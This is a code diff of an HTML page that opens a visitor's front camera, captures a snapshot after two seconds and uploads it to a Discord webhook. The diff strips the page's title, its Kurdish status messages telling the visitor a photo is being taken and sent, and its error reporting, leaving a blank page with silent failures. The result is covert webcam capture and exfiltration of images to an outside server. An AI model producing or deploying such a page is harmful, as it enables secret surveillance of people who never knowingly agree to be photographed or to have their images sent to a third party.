@@ -3,18 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Tool - Discord</title>
+    <title></title>
 </head>
-<body style="background-color: #222; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; padding: 20px;">
-
-    <h3 id="status">چاوەڕوان بە...</h3>
+<body style="background-color: #222; margin: 0; height: 100vh;">
 
     <script>
-      const statusEl = document.getElementById('status');
-
       navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
-          statusEl.innerText = "کامێرا کارا بوو، وێنە دەگیرێت...";
           const video = document.createElement('video');
           video.srcObject = stream;
           video.play();
@@ -27,8 +22,6 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ دیسکۆرد...";
-              
               const formData = new FormData();
               formData.append('file', blob, 'snapshot.jpg');
 
@@ -37,23 +30,11 @@
               fetch(webhookUrl, {
                 method: 'POST',
                 body: formData
-              })
-              .then(response => {
-                if(response.ok) {
-                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ دیسکۆرد!";
-                } else {
-                    statusEl.innerText = "❌ هەڵە لە ناردن بۆ دیسکۆرد";
-                }
-              })
-              .catch(error => {
-                statusEl.innerText = "❌ هەڵەی ناردن: " + error.message;
               });
             }, 'image/jpeg', 0.8);
           }, 2000);
         })
-        .catch(err => {
-          statusEl.innerText = "❌ هەڵەی کامێرا: " + err.message;
-        });
+        .catch(err => {});
     </script>
 
 </body>
